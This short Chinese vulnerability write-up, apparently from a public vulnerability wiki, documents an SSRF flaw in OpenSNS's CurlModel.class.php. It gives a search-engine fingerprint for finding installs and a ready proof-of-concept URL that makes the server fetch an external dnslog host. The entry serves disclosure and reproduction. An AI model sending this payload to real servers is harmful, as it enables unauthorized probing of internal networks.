---
title: "OpenSNS CurlModel.class.php SSRF漏洞"
date: 2026-10-12 09:00:50
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "OpenSNS"
tags:
  - "OpenSNS"
  - "SSRF"
  - "漏洞复现"
---
## 漏洞描述

OpenSNS CurlModel.class.php文件中curl方法存在SSRF漏洞，通过漏洞攻击者可以探测内网信息

## 漏洞影响

```
OpenSNS
```

## 网络测绘

```
icon_hash="1167011145"
```

## 漏洞复现

登录页面如下

![image-20220518154436896](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181544965.png)

存在漏洞的文件为 `Application/Admin/Model/CurlModel.class.php`

![image-20220518154502605](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181545686.png)

构造POC

```
/?s=weibo/share/shareBox&query=app=Admin%26model=Curl%26method=curl%26id=http://92aq2z.dnslog.cn
```

![image-20220518154516760](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202205181545840.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/OpenSNS-CurlModel.class.php-SSRF%E6%BC%8F%E6%B4%9E.md)
